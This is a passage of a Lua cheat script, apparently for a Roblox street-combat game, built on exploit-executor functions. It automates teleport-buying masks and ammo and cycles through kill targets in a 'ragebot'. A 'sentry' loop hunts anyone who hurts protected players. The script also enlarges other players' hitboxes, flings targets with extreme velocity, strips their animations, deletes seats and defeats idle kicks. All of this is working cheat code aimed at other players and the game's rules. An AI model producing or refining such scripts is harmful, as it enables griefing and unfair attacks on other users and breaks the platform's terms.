                buyingGunInProgress = false
            end
        end
        task.wait(0.5)
    end
end)

task.spawn(function()
    while true do
        if not automaskenabled then
            task.wait(1)
            continue
        end
        if not Character then
            task.wait(0.5)
            continue
        end
        local hasMask = Character:FindFirstChild("[Mask]") 
            or Character:FindFirstChild("In-gameMask") 
            or LocalPlayer.Backpack:FindFirstChild("[Mask]")
        if hasMask then
            task.wait(1)
            continue
        end
        if buyingMaskInProgress then
            task.wait(0.5)
            continue
        end
        local ignored = workspace:FindFirstChild("Ignored")
        local shopFolder = ignored and ignored:FindFirstChild("Shop")
        if not shopFolder then
            task.wait(0.5)
            continue
        end
        local maskName = math.random(1, 2) == 1 and "[Skull Mask] - $66" or "[Riot Mask] - $66"
        local maskItem = shopFolder:FindFirstChild(maskName)
        if not maskItem then
            task.wait(0.5)
            continue
        end
        local clickDetector = maskItem:FindFirstChild("ClickDetector")
        local head = maskItem:FindFirstChild("Head")
        if not clickDetector or not head then
            task.wait(0.5)
            continue
        end
        buyingMaskInProgress = true
        local buyAttempts = 0
        while automaskenabled and buyAttempts < 50 do
            hasMask = Character:FindFirstChild("[Mask]") 
                or Character:FindFirstChild("In-gameMask") 
                or LocalPlayer.Backpack:FindFirstChild("[Mask]")
            if hasMask then
                break
            end
            if not humanoid or humanoid.Health <= 0 then
                break
            end
            if root then
                root.CFrame = CFrame.new(head.CFrame.Position + Vector3.new(0, -8, 0))
            end
            fireclickdetector(clickDetector)
            buyAttempts = buyAttempts + 1
            task.wait(0.1)
        end
        if hasMask or LocalPlayer.Backpack:FindFirstChild("[Mask]") then
            task.spawn(function()
                local equipAttempts = 0
                while automaskenabled and equipAttempts < 30 do
                    if not Character then break end
                    if Character:FindFirstChild("In-gameMask") then
                        local equippedMask = Character:FindFirstChild("[Mask]")
                        if equippedMask then
                            equippedMask.Parent = LocalPlayer.Backpack
                        end
                        break
                    end
                    local maskTool = LocalPlayer.Backpack:FindFirstChild("[Mask]")
                    if maskTool and humanoid then
                        for _, tool in ipairs(Character:GetChildren()) do
                            if tool:IsA("Tool") and tool.Name ~= "[Mask]" then
                                tool.Parent = LocalPlayer.Backpack
                            end
                        end
                        humanoid:EquipTool(maskTool)
                        task.wait(0.1)
                        maskTool:Activate()
                    end
                    equipAttempts = equipAttempts + 1
                    task.wait(0.2)
                end
                buyingMaskInProgress = false
            end)
        else
            buyingMaskInProgress = false
        end
        task.wait(0.5)
    end
end)

task.spawn(function()
    while true do
        local equippedGuns = getEquippedGuns()
        for _, tool in ipairs(equippedGuns) do
            local gunName = tool.Name
            if not hasGun(gunName) then continue end
            local ammoCount = getAmmoCount(gunName)
            if not ammoCount or ammoCount > 0 then continue end
            if buyingInProgress then
                continue
            end
            local ammoItemName = AmmoMap[gunName]
            if not ammoItemName then continue end
            local ignored = workspace:FindFirstChild("Ignored")
            local shopFolder = ignored and ignored:FindFirstChild("Shop")
            local ammoItem = shopFolder and shopFolder:FindFirstChild(ammoItemName)
            if not ammoItem then continue end
            local clickDetector = ammoItem:FindFirstChild("ClickDetector")
            local head = ammoItem:FindFirstChild("Head")
            if not clickDetector or not head then continue end
            buyingInProgress = true
            if humanoid then
                humanoid:UnequipTools()
            end
            local lastAmmo = getAmmoCount(gunName)
            local purchaseCount = 0
            while purchaseCount < 6 do
                if not humanoid or humanoid.Health <= 0 then
                    break
                end
                if root then
                    root.CFrame = CFrame.new(head.CFrame.Position + Vector3.new(0, -8, 0))
                end
                fireclickdetector(clickDetector)
                task.wait(0.15)
                local newAmmo = getAmmoCount(gunName)
                if newAmmo and newAmmo > lastAmmo then
                    lastAmmo = newAmmo
                    purchaseCount = purchaseCount + 1
                end
            end
            reloadTool()
            buyingInProgress = false
        end
        task.wait(0.5)
    end
end)

task.spawn(function()
    while true do
        if not Character or not humanoid or humanoid.Health <= 0 then
            task.wait(0.5)
            continue
        end
        if buyingInProgress or buyingGunInProgress or buyingMaskInProgress then
            task.wait(0.5)
            continue
        end
        local hasEquippedGun = false
        for _, tool in ipairs(Character:GetChildren()) do
            if tool:IsA("Tool") then
                for _, gunKey in ipairs(Guns) do
                    if tool.Name == gunData[gunKey].toolName then
                        hasEquippedGun = true
                        break
                    end
                end
                if hasEquippedGun then break end
            end
        end
        if not hasEquippedGun then
            local Backpack = LocalPlayer:FindFirstChild("Backpack")
            if Backpack then
                for _, gunKey in ipairs(Guns) do
                    local gunName = gunData[gunKey].toolName
                    local gun = Backpack:FindFirstChild(gunName)
                    if gun and humanoid then
                        humanoid:EquipTool(gun)
                        break
                    end
                end
            end
        end
        for _, tool in ipairs(Character:GetChildren()) do
            if tool:IsA("Tool") and tool:FindFirstChild("Ammo") then
                local ammo = tool.Ammo
                if typeof(ammo.Value) == "number" and ammo.Value <= 0 then
                    ReplicatedStorage.MainEvent:FireServer("Reload", tool)
                end
            end
        end
        if autodrop then
            ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
        end
        if koValue and koValue.Value == true then
            humanoid.Health = 0
        end
        if shouldSwitch and #ragebottargets > 0 then
            local attempts = 0
            while attempts < #ragebottargets do
                currentTargetIndex = (currentTargetIndex % #ragebottargets) + 1
                local candidate = ragebottargets[currentTargetIndex]
                if candidate and candidate.Character then
                    local candidateBodyEffects = candidate.Character:FindFirstChild("BodyEffects")
                    local isDeath = candidateBodyEffects and candidateBodyEffects:FindFirstChild("SDeath") and candidateBodyEffects["SDeath"].Value
                    if not isDeath then
                        lockedTarget = candidate
                        shouldSwitch = false
                        break
                    end
                end
                attempts = attempts + 1
            end
        end
        task.wait(0.2)
    end
end)

task.spawn(function()
    while task.wait(0.2) do
        if getgenv().enabled1 and not lockedTarget then
            local playersToCheck = {getgenv().Owner}
            for pname, _ in pairs(getgenv().sentryprotected) do
                table.insert(playersToCheck, pname)
            end
            for _, pname in ipairs(playersToCheck) do
                local plr = Players:FindFirstChild(pname)
                if plr and plr.Character then
                    local char = plr.Character
                    local bodyEffects = char:FindFirstChild("BodyEffects")
                    local lastDamager = bodyEffects and bodyEffects:FindFirstChild("LastDamager")
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if bodyEffects and lastDamager and hum then
                        local healthNow = hum.Health
                        if getgenv().lastHealths[pname] == nil then
                            getgenv().lastHealths[pname] = healthNow
                        end
                        if healthNow + 0.05 < getgenv().lastHealths[pname] then
                            getgenv().lastHealths[pname] = healthNow
                            task.wait(0.1)
                            local recheck = char:FindFirstChild("BodyEffects")
                            local recheckDamager = recheck and recheck:FindFirstChild("LastDamager")
                            local attackerName = recheckDamager and tostring(recheckDamager.Value)
                            if attackerName and attackerName ~= "" then
                                local attacker = Players:FindFirstChild(attackerName)
                                if attacker then
                                    sentrytarget = attacker
                                    teleporting = true
                                    voiding = false
                                end
                            end
                        else
                            getgenv().lastHealths[pname] = healthNow
                        end
                        if sentrytarget and sentrytarget.Character then
                            local atkChar = sentrytarget.Character
                            local atkBodyEffects = atkChar:FindFirstChild("BodyEffects")
                            local isKO = atkBodyEffects and atkBodyEffects:FindFirstChild("K.O") and atkBodyEffects["K.O"].Value
                            if isKO then
                                sentrytarget = nil
                                teleporting = false
                                voiding = true
                                reloadTool()
                            end
                        end
                    else
                        getgenv().lastHealths[pname] = nil
                    end
                else
                    getgenv().lastHealths[pname] = nil
                end
            end
        end
    end
end)

task.spawn(function()
    while task.wait() do
        if summonTarget and summonTarget.Character and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            if not Character then continue end
            local hrp = Character:FindFirstChild("HumanoidRootPart")
            local thrp = summonTarget.Character:FindFirstChild("HumanoidRootPart")
            if hrp and thrp then
                hrp.Velocity = Vector3.zero
                hrp.RotVelocity = Vector3.zero
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
                local offset
                if summonMode == "middle" then
                    offset = CFrame.new(0, 3, 4)
                elseif summonMode == "right" then
                    offset = CFrame.new(3, 3, 0)
                elseif summonMode == "left" then
                    offset = CFrame.new(-3, 3, 0)
                else
                    offset = CFrame.new(0, 3, 4)
                end

                hrp.CFrame = thrp.CFrame * offset

                hrp.Velocity = Vector3.zero
                hrp.RotVelocity = Vector3.zero
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end
end)

local hitboxsize = 30

local Players = cloneref(game:GetService("Players"))
local Client = Players.LocalPlayer

RunService.RenderStepped:Connect(function ()
    for _, Player in pairs(Players:GetPlayers()) do
        if Player ~= Client then
            local character = Player.Character
            if character then
                local HRP = character:FindFirstChild("HumanoidRootPart")
                if HRP then
                    HRP.Size = Vector3.new(hitboxsize, hitboxsize, hitboxsize)
                    HRP.CanCollide = false
                end
            end
        end
    end
end)

RunService.Heartbeat:Connect(function()
    if not (flingonly and lockedTarget) then return end

    Player.Character.HumanoidRootPart.Velocity = Vector3.new(99999999, 99999999, 99999999)
    RunService.RenderStepped:Wait()
    Player.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
end)

Player.CharacterAdded:Connect(function(newChar)
    Character = newChar
    humanoid = Character:WaitForChild("Humanoid")
    bodyEffects = Character:WaitForChild("BodyEffects")
    koValue = bodyEffects:WaitForChild("K.O")
end)

local Workspace = game:GetService("Workspace")

for _, v in ipairs(Workspace:GetDescendants()) do
    if v:IsA("Seat") then
        v:Destroy()
    end
end

Workspace.DescendantAdded:Connect(function(descendant)
    task.defer(function()
        if descendant:IsA("Seat") then
            descendant:Destroy()
        end
    end)
end)

local antiConnections = {}

function stripAnimations(character)
    if character:GetAttribute("AntiServerLaggerHandled") then return end
    character:SetAttribute("AntiServerLaggerHandled", true)

    local humanoid = character:WaitForChild("Humanoid", 5)
    if not humanoid then return end

    local animator = humanoid:FindFirstChildOfClass("Animator")
    if animator then
        animator:Destroy()
    end

    local animate = character:FindFirstChild("Animate")
    if animate then
        animate.Disabled = true
    end

    humanoid.AutoRotate = false
end

function onPlayer(player)
    if player == LocalPlayer then return end

    if player.Character then
        stripAnimations(player.Character)
    end

    local charConn = player.CharacterAdded:Connect(stripAnimations)
    table.insert(antiConnections, charConn)
end

function EnableAntiServerLagger()
    for _, player in ipairs(Players:GetPlayers()) do
        onPlayer(player)
    end

    antiConnections.playerAdded = Players.PlayerAdded:Connect(onPlayer)
end

EnableAntiServerLagger()

if BlackScreen then
    pcall(function()
        local Players = game:GetService("Players")
        local player = Players.LocalPlayer
        local cam = workspace.CurrentCamera

        cam.CameraType = Enum.CameraType.Scriptable
        cam.CFrame = CFrame.new(99999, 99999, 99999)

        player.CharacterAdded:Connect(function()
            task.wait(1)
            cam.CameraType = Enum.CameraType.Scriptable
            cam.CFrame = CFrame.new(99999, 99999, 99999)
        end)

        workspace.Terrain:Clear()

        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("ParticleEmitter") or obj:IsA("Light") then
                obj:Destroy()
            end
            if obj:IsA("BasePart") then
                obj.Transparency = 1
                obj.CastShadow = false
                obj.Material = Enum.Material.SmoothPlastic
                if obj:FindFirstChild("SurfaceAppearance") then
                    obj.SurfaceAppearance:Destroy()
                end
            end
        end

        local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
        gui.Name = "FPS_BLACKOUT"
        gui.Parent = game.CoreGui
        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

        local frame = Instance.new("Frame", gui)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.Position = UDim2.new(-0.5, 0, -0.5, 0)
        frame.Size = UDim2.new(2, 0, 2, 0)
        frame.ZIndex = 9999
    end)
end

setfpscap(FPSCap)

pcall(function()
    settings().Rendering.QualityLevel = "Level01"
    UserSettings():GetService("UserGameSettings").MasterVolume = 0
end)
pcall(function()
    local lasers = workspace:FindFirstChild("MAP") and workspace.MAP:FindFirstChild("Indestructible") and workspace.MAP.Indestructible:FindFirstChild("Lasers")
    if lasers then
        lasers:Destroy()
    end
end)
pcall(function()
    pcall(function()
        for _, descendant in ipairs(workspace:GetDescendants()) do
            if descendant:IsA("BasePart") then
                descendant.Material = Enum.Material.Plastic
                descendant.Color = Color3.fromRGB(0, 0, 0)
                descendant.Reflectance = 0
                descendant.CastShadow = false
            end
        end

        workspace.DescendantAdded:Connect(function(part)
            if part:IsA("BasePart") then
                part.Material = Enum.Material.Plastic
                part.Color = Color3.fromRGB(0, 0, 0)
                part.Reflectance = 0
                part.CastShadow = false
            end
        end)
    end)

    pcall(function()
        local VirtualUser = game:GetService("VirtualUser")
        game:GetService("Players").LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end)
end)
